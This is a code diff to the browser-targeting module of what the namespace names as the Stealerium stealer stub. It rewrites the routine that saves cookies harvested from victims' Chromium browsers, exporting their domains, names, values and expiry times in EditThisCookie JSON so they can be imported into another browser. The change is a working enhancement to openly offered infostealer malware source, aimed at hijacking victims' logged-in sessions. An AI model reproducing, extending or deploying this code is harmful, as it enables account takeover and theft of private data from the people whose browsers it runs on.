@@ -1,9 +1,10 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using Stealerium.Stub.Helpers;
 using Stealerium.Stub.Target.Browsers.Chromium;
+using System.Text.Json;
 
 namespace Stealerium.Stub.Target.Browsers
 {
@@ -119,7 +120,7 @@ namespace Stealerium.Stub.Target.Browsers
         }
 
         /// <summary>
-        /// Writes cookie data to a file.
+        /// Writes cookie data to a file in EditThisCookie JSON format.
         /// </summary>
         /// <param name="cCookies">List of cookies to write.</param>
         /// <param name="sFile">File path to save the data.</param>
@@ -127,13 +128,38 @@ namespace Stealerium.Stub.Target.Browsers
         {
             try
             {
-                foreach (var cCookie in cCookies)
-                    File.AppendAllText(sFile, FormatCookie(cCookie));
+                var editThisCookieFormat = cCookies.Select(cookie => new
+                {
+                    domain = cookie.HostKey,
+                    name = cookie.Name,
+                    path = cookie.Path,
+                    expirationDate = ConvertToUnixTimestamp(cookie.ExpiresUtc),
+                    value = cookie.Value,
+                    secure = cookie.IsSecure == "1",
+                    httpOnly = false,
+                    sameSite = "no_restriction",
+                    storeId = "0"
+                }).ToList();
+
+                File.WriteAllText(sFile, JsonSerializer.Serialize(
+                    editThisCookieFormat, 
+                    new JsonSerializerOptions { WriteIndented = true }
+                ));
             }
             catch
             {
                 // Handle or log exception if needed
             }
+        }
+
+        private static double ConvertToUnixTimestamp(string expiresUtc)
+        {
+            if (DateTime.TryParse(expiresUtc, out DateTime dateTime))
+            {
+                var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+                return (dateTime.ToUniversalTime() - epoch).TotalSeconds;
+            }
+            return 0;
         }
 
         /// <summary>
